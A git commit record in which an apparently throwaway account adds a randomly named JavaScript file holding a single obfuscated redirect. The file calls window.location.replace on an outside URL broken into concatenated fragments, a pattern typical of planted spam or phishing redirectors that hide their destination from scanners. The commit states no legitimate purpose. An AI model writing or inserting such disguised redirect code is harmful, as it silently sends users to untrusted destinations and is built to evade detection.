758992776650ca3dcf17f8b6316d06d96dab7a3d
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2023-01-28 16:15:06 +0100

    Create ushfjsgjfgwksjegfkwegjfkewj.js

---
+++ ushfjsgjfgwksjegfkwegjfkewj.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://www.r`,`oadswo`,`rks.com/gQ_hB`,`EIKQRfugBl4S`,`r-C7MGp0_`,`vJ_TZ0fyk0`,`nl1X5KuT`,`D-X4KZGc`,`5UClrWWcIpWPZThWDd3`,`E1YiXt1fK81NRqQ~~`))
